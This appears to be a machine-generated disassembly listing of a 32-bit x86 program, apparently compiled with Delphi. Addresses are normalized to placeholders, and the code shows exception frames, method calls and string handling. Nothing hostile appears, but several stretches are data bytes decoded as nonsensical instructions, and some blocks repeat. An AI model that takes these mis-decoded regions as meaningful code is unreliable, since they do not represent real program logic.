mov eax [ eax + 0xc8 ]
call sub_40436c
dec eax
jge r-xdata
mov eax [ ebp - 0xc ]
dec [ eax + 0x118 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x7c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x70 ]
mov ecx [ eax ]
call [ ecx + 0x94 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax r-xdata
call sub_405e08
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ sub_47094c ]
call sub_40badc
call sub_403a64
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x70 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x70 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x118 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx [ eax ]
call [ edx + 0x58 ]
xor ecx ecx
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x6c ]
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x118 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47f065
lea eax [ ebp - 0x18 ]
mov edx 0x3
call sub_4040d0
lea eax [ ebp - 0x8 ]
call sub_4040ac
retn
sub_47efb5
push [ ebp - 0x18 ]
push r-xdata
push [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
add eax 0x78
mov edx 0x4
call sub_40442c
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x6c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x78 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov ecx [ eax ]
call [ ecx + 0x7c ]
call sub_403ae0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x70 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x118 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx [ eax ]
call [ edx + 0x58 ]
xor ecx ecx
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x6c ]
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x118 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47f065
lea eax [ ebp - 0x18 ]
mov edx 0x3
call sub_4040d0
lea eax [ ebp - 0x8 ]
call sub_4040ac
retn
xor eax eax
push ebp
push j_sub_4038a4#6
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov cl 0x1
xor edx edx
call sub_479b60
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x8 ]
call sub_408120
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0xc ]
call sub_47ed04
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x70 ]
mov eax [ eax + 0xc8 ]
call sub_40436c
dec eax
jge r-xdata
mov eax [ ebp - 0xc ]
dec [ eax + 0x118 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x7c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x70 ]
mov ecx [ eax ]
call [ ecx + 0x94 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax r-xdata
call sub_405e08
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ sub_47094c ]
call sub_40badc
call sub_403a64
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x70 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
sub_47f0a4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_47f0c9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47f0d0
retn
sub_47f0e9
int1
inc edi
add ah ch
int1
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh dl
int1
inc edi
add al dl
add [ eax ] al
add [ eax * 4 + 0x1ae00047 ] bh
inc edx
add ah ch
xor al 0x40
add [ esp + edx ] dh
inc edx
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax - 0x6fffb874 ] cl
nop
inc ecx
add al ch
push ss
inc edx
add [ edi + ecx * 4 + 0x17c00041 ] ch
inc edx
add [ esp + edx * 4 + 0x47 ] cl
add al dl
pop ss
inc edx
add al cl
sbb [ edx ] al
clc
sbb al [ edx ]
loopne r-xdata
push edi
inc edi
add [ ecx * 4 - 0xb5fffb9 ] ah
inc edi
add [ eax ] al
mov al [ edi ]
test al 0x8a
inc edi
add [ eax - 0x63 ] ch
inc edi
add [ eax ] bh
lahf
inc edi
add [ ebx + ecx * 4 + 0x47 ] bh
add ah ch
mov [ edi ] es
pushfd
0x8d440047 0x47
int3
inc edx
add al bl
pop ss
inc edx
add [ eax ] al
sbb eax [ edx ]
mov bl dh
inc edi
add [ esi + edx * 2 + 0x56ec0047 ] dh
inc edi
add [ edi + edx * 2 ] bl
sub_47f268
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_47f3f4
test eax eax
jne r-xdata
xor eax eax
push ebp
push sub_47f2d9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc8 ] 0xffffffff
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x40 ]
mov eax [ ebp - 0x4 ]
call sub_47f3c8
mov eax [ ebp - 0x4 ]
call sub_47f3f4
mov edx 0xf
call sub_475e7c
mov eax [ ebp - 0x4 ]
mov [ eax + 0xcc ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x90 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47f2fc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_47f3f4
mov ebx eax
xor eax eax
push ebp
push sub_47f366
push [ fs : eax ]
mov [ fs : eax ] esp
xor ecx ecx
mov edx 0x1
mov eax ebx
call sub_475bb4
mov eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc8 ] eax
lea eax [ ebx + 0x14 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc0 ]
call sub_404100
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc4 ]
mov [ ebx + 0x1c ] eax
mov eax ebx
call sub_475d40
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47f388
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_478ba4
mov [ esi + 0xc8 ] 0xffffffff
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax esi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_47f3c8
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4780f8
mov edx eax
mov eax ebx
call sub_479494
mov eax [ ebx + 0x7c ]
mov edx [ eax ]
call [ edx + 0x4c ]
pop ebx
retn
sub_47f404
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
cmp [ esi + 0xcc ] 0x0
jne r-xdata
mov eax esi
call sub_47f3f4
mov edi eax
cmp [ esi + 0xb8 ] 0x0
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x8c ]
test bl bl
je r-xdata
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ esi + 0xc8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esi + 0xc8 ] 0xffffffff
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_47f3f4
mov edx 0x1
call sub_475e7c
mov eax esi
call sub_47f3f4
mov eax [ eax + 0xc ]
push eax
mov eax esi
call sub_47f3f4
pop edx
call sub_475ea4
cmp [ esi + 0xb8 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov edx [ esi + 0xbc ]
mov eax edi
call sub_475f70
mov ebx eax
sub_47f4c4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_47f4e9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47f4f0
retn
sub_47f4fc
dec eax
cmc
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + esi * 8 + 0x47 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov esi 0x9c0047f5
add [ eax ] al
add al dh
fild [ edi ]
loopne r-xdata
inc edi
add [ ebx + ebp * 8 + 0x47 ] ah
add [ edx + ebp * 4 - 0x555fffb9 ] dh
inc edi
add ah dh
rol [ edi ] 0x1
lodsb [ esi ]
sti
inc edi
add [ eax - 0x57 ] ah
inc edi
add al al
test eax 0xaacc0047
inc edi
add [ eax - 0x57ffb85a ] bl
jmp sub_47f5ce
inc eax
add [ edi + ecx + 0x34f00042 ] bh
inc eax
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax - 0x15 ] bh
inc edi
add [ eax + 0x10 ] dh
inc edx
add [ edi ] ah
inc edi
add [ eax + 0x200047d0 ] dl
cmpsd [ esi ] [ edi ]
inc edi
add [ edi ] bl
inc edi
add al bl
iretd
sub_47f5ce
popad
lea eax [ eax ]
and dh dh
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + esi * 8 + 0x47 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0xa ] ch
inc edi
add [ eax + eax ] bh
add al dl
movsd [ edi ] [ esi ]
inc edi
add al ah
xor al 0x40
add [ edi + ecx + 0x34f00042 ] bh
inc eax
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax ] cl
pop es
dec eax
add [ eax + 0x10 ] dh
inc edx
add [ edi ] ah
inc edi
add [ eax ] bl
cmpsd [ esi ] [ edi ]
inc edi
add [ eax ] ah
cmpsd [ esi ] [ edi ]
inc edi
add [ edi ] bl
inc edi
add [ ebp + eax + 0x48 ] dh
add al bl
stosb [ edi ]
inc edi
add [ edx + ebp * 4 - 0x555fffb9 ] dh
inc edi
add [ eax + 0x7 ] cl
dec eax
add [ eax + 0x600047a8 ] dl
test eax 0xa9c00047
inc edi
add ah cl
stosb [ edi ]
inc edi
add [ eax + 0xe0047a6 ] bl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x780040 ] dl
add [ eax ] al
push ss
push esp
dec ecx
dec ebp
popad
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax 0x47f7
inc esi
je r-xdata
push edi
inc edx
add al bl
pop ss
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + esi * 8 + 0x11c0047 ] ah
add [ eax ] al
mov cl ah
inc edi
add al ah
sbb al [ edx ]
in al dx
xor al 0x40
add [ esp + edx ] dh
inc edx
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax * 8 - 0x6f6fffb9 ] dl
inc ecx
add al ch
push ss
inc edx
add [ edi + ecx * 4 - 0x3773ffbf ] ch
inc edi
add [ eax + ecx * 8 + 0x17d00047 ] ch
inc edx
add al cl
sbb [ edx ] al
clc
sbb al [ edx ]
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + 0x47f7 ] bh
inc esp
popad
je r-xdata
inc edx
add [ eax ] al
sbb eax [ edx ]
loopne r-xdata
inc edi
add ah bl
call 0xffffffffe8cbf7b5
inc edi
add [ eax - 0x7 ] al
inc edi
add [ eax + 0x47cd ] bh
leave
inc edi
add [ eax ] bl

inc edi
add [ esi + edx * 2 + 0x56ec0047 ] dh
inc edi
add [ edi + edx * 2 ] bl
sub al 0xf7
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esp
push 0x64616572
lea eax [ eax ]
sub_47f8b4
push ebx
push esi
push edi
mov edi eax
mov esi 0x6
mov ebx rw-data
add ebx 0x4
dec esi
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax edi
mov edx [ ebx ]
call sub_4044b8
jne r-xdata
xor eax eax
pop edi
pop esi
pop ebx
retn
sub_47f8e0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_47e7d4
mov edx 0x15
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov [ esi + 0xfc ] 0x15
mov eax [ sub_47f4fc ]
mov [ esi + 0xa8 ] eax
mov [ esi + 0x118 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax esi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_47f940
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47fb80
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x1
xor eax eax
push ebp
push sub_47fb5e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x68 ]
mov eax [ eax + 0x7c ]
mov edx [ r-xdata ]
call sub_403460
mov eax [ eax + 0x68 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0x10 ] eax
mov ebx [ ebp - 0x8 ]
mov eax [ ebx + 0x70 ]
mov eax [ eax + 0x7c ]
mov edx [ r-xdata ]
call sub_403460
mov eax [ eax + 0x68 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0x14 ] eax
mov esi [ ebx + 0x74 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_418854
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_418854
push 0x0
push 0xfffffffe
mov edx [ ebx + 0x74 ]
mov eax [ rw-data ]
mov eax [ eax ]
xor ecx ecx
mov ebx [ eax ]
call [ ebx + 0x50 ]
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47fb65
mov ebx [ ebp - 0x8 ]
mov eax [ ebx + 0x70 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_418a0c
inc eax
jle r-xdata
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_418a0c
inc eax
jle r-xdata
push 0xffffffff
lea eax [ ebp - 0x18 ]
push eax
mov ebx [ ebp - 0x8 ]
mov eax [ ebx + 0x70 ]
or ecx 0xffffffff
mov edx r-xdata
mov edi [ eax ]
call [ edi + 0x70 ]
mov edx [ ebp - 0x18 ]
lea eax [ ebx + 0x78 ]
call sub_404100
mov eax [ ebx + 0x78 ]
call sub_40436c
test eax eax
jle r-xdata
push 0xffffffff
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x68 ]
mov edx r-xdata
or ecx 0xffffffff
mov esi [ eax ]
call [ esi + 0x70 ]
mov edx [ ebp - 0x1c ]
mov ebx [ ebp - 0x8 ]
lea eax [ ebx + 0x78 ]
call sub_404100
mov eax [ ebx + 0x78 ]
call sub_40436c
test eax eax
jle r-xdata
mov eax [ ebx + 0x70 ]
mov eax [ eax + 0x74 ]
mov edx [ eax ]
call [ edx ]
cmp edx 0x0
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov edx [ ebx + 0x78 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x68 ]
mov ecx [ eax ]
call [ ecx + 0x7c ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x68 ]
mov eax [ eax + 0x74 ]
mov edx [ eax ]
call [ edx ]
cmp edx 0x0
jne r-xdata
lea eax [ ebx + 0x84 ]
mov edx [ ebx + 0x78 ]
call sub_404100
push 0x1
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebx + 0x84 ]
mov cl 0x1
mov edx r-xdata
call sub_4749f8
mov edx [ ebp - 0x20 ]
lea eax [ ebx + 0x80 ]
call sub_404100
mov eax ebx
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
jg r-xdata
cmp eax 0x0
ja r-xdata
jg r-xdata
cmp eax 0x0
ja r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_480520
mov edx [ ebp - 0x24 ]
mov eax [ ebx + 0x70 ]
mov ecx [ eax ]
call [ ecx + 0x7c ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x48 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
jmp r-xdata
jmp r-xdata
jmp r-xdata
sub_47fba3
inc [ ecx ]
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ebx + 0x56 ] dl
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_47eb18
lea eax [ esi + 0x88 ]
call sub_4040ac
lea eax [ esi + 0x8c ]
call sub_4040ac
xor eax eax
mov [ esi + 0x90 ] eax
xor eax eax
mov [ esi + 0x94 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax esi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_47fc44
push ebp
mov ebp esp
mov ecx 0x5
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
xor eax eax
push ebp
push sub_47fe35
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ ebx ]
mov edx [ edx + 0x84 ]
call sub_404144
mov eax [ ebx ]
add eax 0x88
call sub_4040ac
mov eax [ ebx ]
push [ eax + 0x88 ]
push 0x1
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_4749f8
push [ ebp - 0x8 ]
push r-xdata
mov eax [ ebx ]
add eax 0x88
mov edx 0x3
call sub_40442c
mov eax [ ebx ]
push [ eax + 0x88 ]
push 0x1
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_4749f8
push [ ebp - 0xc ]
push r-xdata
mov eax [ ebx ]
add eax 0x88
mov edx 0x3
call sub_40442c
mov eax [ ebx ]
push [ eax + 0x88 ]
push 0x1
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_4749f8
push [ ebp - 0x10 ]
push r-xdata
mov eax [ ebx ]
add eax 0x88
mov edx 0x3
call sub_40442c
push 0x1
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_4749f8
mov edx [ ebp - 0x14 ]
mov eax [ ebx ]
add eax 0x88
call sub_404374
push 0x1
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_4749f8
mov eax [ ebp - 0x18 ]
call sub_4083c4
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_4083c4
mov edx esi
shl edx 0x8
add eax edx
mov edx [ ebx ]
mov [ edx + 0x90 ] eax
mov eax [ ebx ]
call sub_47fc08
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_47df10
mov esi eax
mov eax [ ebx ]
mov eax [ eax + 0x98 ]
mov [ eax + 0x6c ] esi
mov eax [ ebx ]
mov edx [ eax + 0x88 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x88 ]
mov eax [ ebx ]
mov edx [ eax + 0x90 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax [ ebx ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x20 ]
push eax
lea edx [ ebp - 0x24 ]
mov eax [ rw-data ]
call sub_405e08
mov eax [ ebp - 0x24 ]
push eax
mov eax r-xdata
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] 0xb
lea edx [ ebp - 0x2c ]
xor ecx ecx
pop eax
call sub_408fe4
mov ecx [ ebp - 0x20 ]
lea eax [ ebp - 0x1c ]
mov edx r-xdata
call sub_4043b8
mov edx [ ebp - 0x1c ]
mov eax [ ebx ]
mov eax [ eax + 0x68 ]
mov ecx [ eax ]
call [ ecx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47fe3c
lea eax [ ebp - 0x24 ]
mov edx 0x9
call sub_4040d0
retn
sub_47fe7c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov esi [ ebp + 0x8 ]
add esi 0xfffffffc
xor eax eax
push ebp
push sub_480014
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi ]
add eax 0x88
mov edx [ esi ]
mov edx [ edx + 0x68 ]
mov edx [ edx + 0x7c ]
mov edx [ edx + 0x68 ]
mov edx [ edx + 0x14 ]
call sub_404100
mov eax [ esi ]
call sub_47fc08
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_47f388
mov ebx eax
mov eax [ esi ]
mov eax [ eax + 0x98 ]
mov [ eax + 0x6c ] ebx
lea eax [ ebx + 0xc0 ]
mov edx [ esi ]
mov edx [ edx + 0x88 ]
call sub_404100
mov eax [ esi ]
mov eax [ eax + 0x90 ]
mov [ ebx + 0xc4 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8c ]
mov eax ebx
call sub_47f3f4
mov edx [ eax + 0x14 ]
mov eax [ esi ]
add eax 0x88
call sub_404100
mov eax ebx
call sub_47f3f4
mov eax [ eax + 0x1c ]
mov edx [ esi ]
mov [ edx + 0x90 ] eax
mov al [ r-xdata ]
push eax
lea eax [ ebp - 0x4 ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x88 ]
mov ecx r-xdata
mov edx r-xdata
call sub_40cecc
push [ ebp - 0x4 ]
push r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ esi ]
mov eax [ eax + 0x90 ]
test eax eax
jns r-xdata
sar eax 0x8
call sub_408288
push [ ebp - 0x8 ]
push r-xdata
lea edx [ ebp - 0xc ]
mov eax [ esi ]
mov eax [ eax + 0x90 ]
and eax 0x800000ff
jns r-xdata
add eax 0xff
call sub_408288
push [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
mov edx 0x5
call sub_40442c
mov eax [ esi ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x14 ]
push eax
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405e08
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0xb
lea edx [ ebp - 0x20 ]
xor ecx ecx
pop eax
call sub_408fe4
mov ecx [ ebp - 0x14 ]
lea eax [ ebp - 0x10 ]
mov edx r-xdata
call sub_4043b8
mov edx [ ebp - 0x10 ]
mov eax [ esi ]
mov eax [ eax + 0x68 ]
mov ecx [ eax ]
call [ ecx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48001b
lea eax [ ebp - 0x18 ]
mov edx 0x6
call sub_4040d0
retn
dec eax
or eax 0xffffff00
inc eax
sub_480114
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov esi [ ebp + 0x8 ]
add esi 0xfffffffc
xor eax eax
push ebp
push sub_48027a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi ]
mov eax [ eax + 0x70 ]
mov eax [ eax + 0x7c ]
mov edx [ r-xdata ]
call sub_403460
mov eax [ eax + 0x68 ]
mov edx [ eax + 0x14 ]
mov eax [ esi ]
add eax 0x8c
call sub_404100
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_47f388
mov ebx eax
mov eax [ esi ]
mov eax [ eax + 0x98 ]
mov [ eax + 0x70 ] ebx
lea eax [ ebx + 0xc0 ]
mov edx [ esi ]
mov edx [ edx + 0x8c ]
call sub_404100
mov eax [ esi ]
mov eax [ eax + 0x94 ]
mov [ ebx + 0xc4 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8c ]
mov eax ebx
call sub_47f3f4
mov edx [ eax + 0x14 ]
mov eax [ esi ]
add eax 0x8c
call sub_404100
mov eax ebx
call sub_47f3f4
mov eax [ eax + 0x1c ]
mov edx [ esi ]
mov [ edx + 0x94 ] eax
push 0x0
push r-xdata
mov al [ r-xdata ]
push eax
lea eax [ ebp - 0x8 ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x8c ]
mov ecx r-xdata
mov edx r-xdata
call sub_40cecc
push [ ebp - 0x8 ]
push r-xdata
lea edx [ ebp - 0xc ]
mov eax [ esi ]
mov eax [ eax + 0x94 ]
test eax eax
jns r-xdata
sar eax 0x8
call sub_408288
push [ ebp - 0xc ]
push r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ esi ]
mov eax [ eax + 0x94 ]
and eax 0x800000ff
jns r-xdata
add eax 0xff
call sub_408288
push [ ebp - 0x10 ]
lea eax [ ebp - 0x4 ]
mov edx 0x6
call sub_40442c
mov edx [ ebp - 0x4 ]
mov [ ebp - 0x14 ] 0xc8
lea ecx [ ebp - 0x14 ]
mov eax [ esi ]
mov eax [ eax + 0x70 ]
mov ebx [ eax ]
call [ ebx + 0x74 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_480281
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_4040d0
retn
dec eax
or eax 0xffffff00
inc eax
sub_4802b4
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
add esi 0xfffffffc
xor eax eax
push ebp
push sub_480485
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi ]
mov eax [ eax + 0x70 ]
mov cx 0xe3
mov edx r-xdata
call sub_479a70
lea ecx [ ebp - 0x8 ]
mov eax [ esi ]
mov eax [ eax + 0x70 ]
mov eax [ eax + 0x80 ]
mov eax [ eax + 0x10 ]
xor edx edx
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
call sub_408120
mov ebx [ rw-data ]
mov ebx [ ebx ]
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call ebx
mov ebx eax
mov edi [ rw-data ]
mov edi [ edi ]
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call edi
mov edi eax
test ebx ebx
je r-xdata
or ecx 0xffffffff
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_47485c
mov ebx eax
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_40436c
mov ecx eax
sub ecx ebx
lea edx [ ebx + 0x1 ]
mov eax [ ebp - 0x4 ]
call sub_4045cc
jmp r-xdata
test edi edi
jne r-xdata
mov eax [ esi ]
add eax 0x8c
call sub_4040ac
mov ebx 0x4
lea eax [ ebp - 0x4 ]
push eax
mov ecx edi
sub ecx ebx
dec ecx
lea edx [ ebx + 0x1 ]
mov eax [ ebp - 0x4 ]
call sub_4045cc
mov eax [ esi ]
push [ eax + 0x8c ]
push r-xdata
push 0x1
